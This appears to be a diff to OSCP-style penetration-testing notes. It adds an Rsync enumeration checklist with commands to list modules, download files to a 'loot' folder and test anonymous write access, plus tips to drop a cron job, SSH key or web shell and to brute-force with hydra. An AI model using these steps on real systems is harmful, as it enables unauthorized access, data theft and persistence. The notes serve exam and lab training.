@@ -335,3 +335,47 @@ hydra -l <user_from_snmp> -p <cred_from_snmp> ssh://<target_ip>
 ---
 
 Document which OID/output justified each follow-up action (e.g. "hrSWRunParameters revealed plaintext service password → reused against SMB") — this chain of evidence is what OSCP report grading looks for, not just the final shell.
+
+---
+## Rsync (port 873) — quick checklist**
+
+1. List modules (no login needed):
+
+```
+rsync rsync://<ip>/
+```
+
+2. List files in a module:
+
+```
+rsync -av rsync://<ip>/<module>/
+```
+
+**Decision point:** if the list works with no password → anonymous read access.
+
+3. Download all files from the module:
+
+```
+rsync -av rsync://<ip>/<module>/ ./loot/
+```
+
+4. Check for write access:
+
+```
+echo test > test.txt
+rsync -av test.txt rsync://<ip>/<module>/
+```
+
+**Decision point:** if the upload works → you can push a file. Use this to drop a cron job, SSH key, or web shell if the module path lands in a web root or cron path.
+
+5. If a module needs auth:
+
+```
+rsync -av rsync://<user>@<ip>/<module>/
+```
+
+(enter the password when asked, or use `RSYNC_PASSWORD=<pass>` to skip the prompt)
+
+**Priority order to try:** anonymous list → anonymous download (look for configs, SSH keys, backups) → anonymous write → auth brute force (hydra module `rsync`) if a user name is known.
+
+Note why you ran each step — this is what the OSCP report needs.
